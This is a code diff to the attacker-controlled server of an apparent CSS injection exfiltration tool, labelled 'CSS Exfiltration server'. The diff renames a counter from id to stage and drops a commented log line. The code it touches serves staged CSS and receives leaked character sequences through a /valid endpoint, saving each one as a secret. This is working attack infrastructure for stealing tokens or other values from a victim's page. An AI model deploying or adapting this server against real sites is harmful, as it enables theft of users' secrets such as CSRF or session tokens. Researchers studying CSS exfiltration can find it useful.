@@ -43,7 +43,7 @@ function getCSSWaitingBlock(id) {
  * REQUESTS LOGIC
  */
 var secret = ''
-var id = 0
+var stage = 0
 
 app.get('/', (req, res) => {
     res.send('CSS Exfiltration server')
@@ -53,9 +53,9 @@ app.get('/init.css', (req, res) => {
     console.log('Init process...')
     pending = []
     secret = ''
-    id = 0
+    stage = 0
     res.set({'Content-Type': 'text/css'})
-    css = getCSSyncBlock(id)
+    css = getCSSyncBlock(stage)
     res.end(css)
 })
 
@@ -73,11 +73,11 @@ app.get('/selectors', (req, res) => {
 
 app.get('/valid', (req, res) => {
 
-    console.log(`Valid sequence n°${id} : ${req.query.seq}`)
+    console.log(`Valid sequence n°${stage} : ${req.query.seq}`)
 
     secret = req.query.seq
 
-    id++
+    stage++
 
     res.set({'Content-Type': 'text/css'})
     css = getCSSelectors(secret)
@@ -88,7 +88,7 @@ app.get('/next', async (req, res) => {
 
     const nextId = parseInt(req.query.id, 10)
 
-    if (id == nextId+1) {
+    if (stage == nextId+1) {
         console.log(`Next n°${nextId} passed`)
         res.set({'Content-Type': 'text/css'})
         css = getCSSyncBlock(nextId+1)
@@ -102,8 +102,6 @@ app.get('/next', async (req, res) => {
         }, 1000)
 
     }
-
-    //console.log(`Next n°${req.params.id} & subject id : ${id}`)
 })
 
 app.listen(port, () => {
